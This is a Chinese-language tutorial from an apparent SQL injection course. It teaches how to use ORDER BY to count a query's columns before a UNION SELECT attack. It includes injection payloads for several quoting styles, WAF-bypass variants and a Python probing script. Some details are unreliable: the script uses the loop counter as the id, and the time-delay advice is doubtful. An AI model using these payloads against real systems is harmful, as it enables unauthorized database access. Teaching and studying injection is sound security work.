# Day 16：ORDER BY判列数——SQL注入必学技能

> **学习目标**：掌握使用ORDER BY判断数据库表列数的方法，为联合查询做准备
> 
> **学习时长**：2小时
> 
> **难度等级**：⭐⭐⭐⭐

---

## 📚 今日内容概览

1. ORDER BY原理详解
2. 判列数方法
3. 实战练习：确定列数
4. 常见问题解决
5. 进阶技巧

---

## 一、ORDER BY原理详解

### 1.1 ORDER BY是什么

```
ORDER BY是什么：
  SQL语句中用于对查询结果进行排序的子句
  可以按指定列或表达式排序
  默认升序（ASC），可指定降序（DESC）

基本语法：
  SELECT column1, column2 FROM table ORDER BY column_name ASC|DESC;

示例：
  SELECT * FROM users ORDER BY id ASC;  -- 按id升序
  SELECT * FROM users ORDER BY name DESC;  -- 按姓名降序
  SELECT * FROM users ORDER BY 1;  -- 按第一列排序
```

### 1.2 ORDER BY工作原理

```
工作原理：
  1. 数据库执行SELECT查询
  2. 根据ORDER BY指定的列进行排序
  3. 如果指定的列不存在，会报错
  
关键发现：
  ORDER BY后面可以跟列名或数字
  如果跟数字N，代表按第N列排序
  如果N超过实际列数，会报错

示例：
  表users有3列：id, name, password
  
  SELECT * FROM users ORDER BY 3;  -- 正常，按第3列排序
  SELECT * FROM users ORDER BY 4;  -- 报错，没有第4列
```

### 1.3 ORDER BY在SQL注入中的应用

```
应用场景：
  在SQL注入中，ORDER BY可以用来判断表的列数
  通过递增数字直到报错，确定表的列数
  
为什么需要判断列数：
  联合查询（UNION SELECT）要求两个查询的列数相同
  必须先知道列数才能构造正确的联合查询

示例：
  注入语句：?id=1 ORDER BY 1
  如果正常，尝试ORDER BY 2
  如果正常，尝试ORDER BY 3
  ...直到报错，确定列数
```

---

## 二、判列数方法

### 2.1 基本方法

```
方法1：递增法
  从1开始递增，直到报错
  
步骤：
  1. ?id=1 ORDER BY 1 -- 正常
  2. ?id=1 ORDER BY 2 -- 正常
  3. ?id=1 ORDER BY 3 -- 正常
  4. ?id=1 ORDER BY 4 -- 报错
  5. 结论：表有3列

方法2：二分法
  使用二分查找快速定位
  
步骤：
  1. ?id=1 ORDER BY 10 -- 报错（列数<10）
  2. ?id=1 ORDER BY 5 -- 正常（列数>=5）
  3. ?id=1 ORDER BY 7 -- 报错（列数<7）
  4. ?id=1 ORDER BY 6 -- 正常（列数>=6）
  5. ?id=1 ORDER BY 7 -- 报错（列数<7）
  6. 结论：表有6列

推荐：
  列数较少时用递增法
  列数较多时用二分法
```

### 2.2 数字型注入判列数

```
Payload格式：
  ?id=1 ORDER BY N--
  
示例：
  http://example.com/api/user?id=1 ORDER BY 1--
  http://example.com/api/user?id=1 ORDER BY 2--
  http://example.com/api/user?id=1 ORDER BY 3--
  
注意：
  末尾的--用于注释掉后面的SQL语句
```

### 2.3 字符型注入判列数

```
Payload格式：
  ?username=admin' ORDER BY N--
  
示例：
  http://example.com/login?username=admin' ORDER BY 1--
  http://example.com/login?username=admin' ORDER BY 2--
  http://example.com/login?username=admin' ORDER BY 3--
  
注意：
  需要先闭合单引号，再添加ORDER BY
```

### 2.4 带括号的判列数

```
Payload格式：
  ?q=test') ORDER BY N--
  
示例：
  http://example.com/search?q=test') ORDER BY 1--
  http://example.com/search?q=test') ORDER BY 2--
  
注意：
  需要根据闭合方式调整Payload
```

---

## 三、实战练习：确定列数

### 3.1 练习1：数字型注入

```
题目：
  URL：http://example.com/user?id=1
  已知存在数字型注入，确定表的列数

步骤：
  1. ?id=1 ORDER BY 1 -- 正常显示用户信息
  2. ?id=1 ORDER BY 2 -- 正常显示
  3. ?id=1 ORDER BY 3 -- 正常显示
  4. ?id=1 ORDER BY 4 -- 报错：Unknown column '4' in 'order clause'
  5. 结论：表有3列

验证：
  ?id=-1 UNION SELECT 1,2,3 -- 应该正常显示
```

### 3.2 练习2：字符型注入

```
题目：
  URL：http://example.com/login?username=admin
  已知存在字符型注入（单引号闭合），确定列数

步骤：
  1. ?username=admin' ORDER BY 1-- -- 正常显示登录失败
  2. ?username=admin' ORDER BY 2-- -- 正常显示
  3. ?username=admin' ORDER BY 3-- -- 正常显示
  4. ?username=admin' ORDER BY 4-- -- 报错
  5. 结论：表有3列

验证：
  ?username=admin' UNION SELECT 1,2,3-- -- 应该显示联合查询结果
```

### 3.3 练习3：复杂闭合方式

```
题目：
  URL：http://example.com/search?q=test
  已知闭合方式是("test")，确定列数

步骤：
  1. ?q=test") ORDER BY 1-- -- 正常
  2. ?q=test") ORDER BY 2-- -- 正常
  3. ?q=test") ORDER BY 3-- -- 正常
  4. ?q=test") ORDER BY 4-- -- 正常
  5. ?q=test") ORDER BY 5-- -- 报错
  6. 结论：表有4列

验证：
  ?q=test") UNION SELECT 1,2,3,4-- -- 应该正常显示
```

---

## 四、常见问题解决

### 4.1 问题1：ORDER BY被过滤

```
现象：
  使用ORDER BY时没有响应或被拦截

解决方法：
  1. 使用大小写混合：Order By、ORDER BY
  2. 使用注释：O/**/RDER /**/BY
  3. 使用编码：%4F%52%44%45%52%20%42%59（ORDER BY的URL编码）
  4. 使用等价语句：GROUP BY

示例：
  ?id=1 O/**/RDER /**/BY 3--
  ?id=1 Order By 3--
  ?id=1 GROUP BY 3--
```

### 4.2 问题2：没有报错信息

```
现象：
  ORDER BY超过列数时没有报错，而是返回空或默认页面

解决方法：
  1. 观察响应变化：正常和异常的响应长度或内容是否不同
  2. 使用UNION SELECT测试：从1列开始尝试
  3. 使用盲注技术：通过时间延迟判断

示例：
  ?id=1 ORDER BY 100 -- 如果响应时间变长，可能列数小于100
```

### 4.3 问题3：响应内容相同

```
现象：
  无论ORDER BY几，响应内容都相同

解决方法：
  1. 尝试使用UNION SELECT直接测试列数
  2. 尝试不同的排序方式：ORDER BY N DESC
  3. 检查是否有WAF拦截

示例：
  ?id=-1 UNION SELECT 1 -- 如果报错，说明列数不是1
  ?id=-1 UNION SELECT 1,2 -- 如果报错，说明列数不是2
```

---

## 五、进阶技巧

### 5.1 快速确定列数

```
技巧1：从较大数字开始
  如果猜测表可能有10列，先试ORDER BY 10
  如果报错，再试ORDER BY 5
  快速缩小范围

技巧2：使用UNION SELECT直接测试
  ?id=-1 UNION SELECT 1,2,3,4,5,6,7,8,9,10
  根据报错信息判断需要多少列

技巧3：使用GROUP BY
  GROUP BY和ORDER BY类似，可以用来判列数
  ?id=1 GROUP BY 3--
```

### 5.2 绕过WAF技巧

```
技巧1：使用内联注释
  ?id=1 /*!ORDER*/ BY 3--
  MySQL会执行/*!...*/中的内容

技巧2：使用字符编码
  ?id=1 %4F%52%44%45%52%20%42%59%20%33--
  URL编码绕过

技巧3：使用换行符
  ?id=1
  ORDER BY 3--
  有些WAF不会检测换行后的内容

技巧4：使用注释符
  ?id=1 ORDER/*comment*/BY 3--
```

### 5.3 自动化脚本

```
Python脚本示例：
import requests

url = "http://example.com/user?id="

for i in range(1, 20):
    payload = f"{i} ORDER BY {i}--"
    r = requests.get(url + payload)
    if "error" in r.text.lower():
        print(f"表有{i-1}列")
        break
else:
    print("超过19列")

注意：
  实际使用时需要根据目标调整检测逻辑
```

---

## 六、今日总结

### 6.1 知识点回顾

```
✅ ORDER BY原理
  - 排序功能
  - 数字参数代表列序号
  
✅ 判列数方法
  - 递增法
  - 二分法
  
✅ 不同注入类型的Payload
  - 数字型：?id=1 ORDER BY N--
  - 字符型：?username=admin' ORDER BY N--
  - 带括号：?q=test") ORDER BY N--
  
✅ 常见问题解决
  - ORDER BY被过滤
  - 没有报错信息
  - 响应内容相同
  
✅ 进阶技巧
  - 快速确定列数
  - 绕过WAF
  - 自动化脚本
```

### 6.2 关键记忆点

```
记住这个口诀：

ORDER BY判列数，从1开始往上数；
数字代表列序号，报错就知列数到；
先判列数再联合，注入成功第一步！

流程：
  判断注入类型 → ORDER BY判列数 → UNION SELECT联合查询
```

### 6.3 今日作业

```
必做题：
  1. 完成三个练习题目
  2. 记录判列数步骤
  3. 验证联合查询

选做题：
  1. 尝试二分法判列数
  2. 练习绕过WAF技巧
  3. 写一个简单的自动化脚本

提交内容：
  - 判列数步骤记录
  - 列数结果
  - 截图
```

### 6.4 明日预告

```
Day 17：UNION SELECT联合查询

学习内容：
  - UNION SELECT原理
  - 构造联合查询Payload
  - 获取数据库信息
```

---

**恭喜你完成Day 16的学习！明天学习UNION SELECT联合查询！** 🎉
